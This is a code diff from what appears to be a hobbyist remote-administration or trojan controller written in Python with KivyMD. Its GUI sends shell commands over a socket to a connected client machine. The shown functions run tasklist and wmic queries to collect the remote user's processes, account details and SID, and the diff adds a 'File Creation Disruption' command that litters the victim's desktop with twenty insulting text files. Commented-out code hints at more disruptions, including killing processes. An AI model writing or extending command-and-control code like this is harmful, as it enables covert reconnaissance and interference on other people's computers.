@@ -71,13 +71,21 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.UserInfo()
+            MDRectangleFlatButton:
+                id: fileCreateBtn
+                text: "File Creation Disruption"
+                pos_hint: {"center_x": .5, "center_y": .5}
+                opacity: 1
+                disabled: False
+                on_press: app.FileCreate()
 '''
+
 
 class Main(MDApp):
     def build(self):
         self.theme_cls.theme_style = "Dark"
         self.theme_cls.primary_palette = "BlueGray"
-        
+
         return Builder.load_string(KV)
 
     def StartServer(self):
@@ -134,17 +142,16 @@ class Main(MDApp):
 
     def Tasks(self):
         while True:
-            #Send command to client
+            # Send command to client
             command = 'tasklist'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
-            #Receive output from client
-            output = self.currConn.recv(20480)  #Still needs more buffer
+            # Receive output from client
+            output = self.currConn.recv(20480)  # Still needs more buffer
             output = output.decode()
             print('Output: ', output)
             break
-
 
     def Services(self):
         while True:
@@ -165,22 +172,30 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             output = self.currConn.recv(8096).decode()
             output = output.splitlines()
-            
+
             # Get SID
             command = 'wmic useraccount where name="%USERNAME%" get sid'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             output2 = self.currConn.recv(8096).decode()
             output2 = output2.splitlines()
-            
+
             # Print results
             print('Output: ')
             print(f"{output[0]}\n{output[1]}\n{output[8]}")
             print(f"SID\t\t\t\t\t\t\t{output2[2]}")
             break
 
+    # File creation disruption
+    def FileCreate(self):
+        while True:
+            command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            break
+
 """
-UNTESTED SO I COMMENTED DISRUPRIONS OUT FOR NOW OMEGALUL
+UNTESTED SO I COMMENTED DISRUPRTIONS OUT FOR NOW OMEGALUL
 def KillTask():
     while True:
         procname = input('Enter Process Name: ')
